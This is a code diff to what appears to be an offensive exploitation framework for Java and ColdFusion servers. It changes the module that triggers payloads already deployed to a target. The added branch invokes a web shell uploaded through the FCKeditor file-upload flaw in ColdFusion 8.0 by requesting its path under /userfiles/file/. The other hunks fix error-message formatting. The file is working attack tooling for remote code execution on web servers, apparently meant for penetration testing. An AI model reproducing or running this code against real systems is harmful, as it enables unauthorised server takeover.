@@ -4,7 +4,7 @@ from log import LOG
 import utility
 
 
-def invoke(fingerengine, fingerprint):
+def invoke(fingerengine, fingerprint, deployer):
     """
     """
 
@@ -12,8 +12,8 @@ def invoke(fingerengine, fingerprint):
         return invoke_war(fingerengine, fingerprint)
 
     elif fingerengine.service in ["coldfusion"]:
-        return invoke_cf(fingerengine, fingerprint)
-    
+        return invoke_cf(fingerengine, fingerprint, deployer)
+
     else:
         utility.Msg("Platform %s does not support --invoke" % 
                             fingerengine.options.remote_service, LOG.ERROR)
@@ -44,11 +44,11 @@ def invoke_war(fingerengine, fingerprint):
     if _invoke(url): 
         utility.Msg("{0} invoked at {1}".format(dfile, fingerengine.options.ip))
     else:
-        utility.Msg("Failed to invoke {0}".format(parse_war_path(dfile, True),
-                                                  LOG.ERROR))
+        utility.Msg("Failed to invoke {0}".format(parse_war_path(dfile, True)),
+                                                  LOG.ERROR)
 
 
-def invoke_cf(fingerengine, fingerprint):
+def invoke_cf(fingerengine, fingerprint, deployer):
     """
     """
 
@@ -58,6 +58,11 @@ def invoke_cf(fingerengine, fingerprint):
         # deployments to 10 require us to trigger a 404
         url = "http://{0}:{1}/CFIDE/ad123.cfm".format(fingerengine.options.ip,
                                                       fingerprint.port)
+    elif fingerprint.version in ["8.0"] and "fck_editor" in deployer.__name__:
+        # invoke a shell via FCKeditor deployer
+        url = "http://{0}:{1}/userfiles/file/{2}".format(fingerengine.options.ip,
+                                                         fingerprint.port,
+                                                         dfile)
     else:
         url = "http://{0}:{1}/CFIDE/{2}".format(fingerengine.options.ip,
                                                fingerprint.port,
@@ -78,8 +83,6 @@ def _invoke(url):
         response = utility.requests_get(url)
         if response.status_code == 200:
             status = True
-        else:
-            utility.Msg("Failed to invoke (HTTP %d)" % response.status_code)
     except Exception, e:
         utility.Msg("Failed to invoke payload: %s" % e, LOG.ERROR)
         status = False
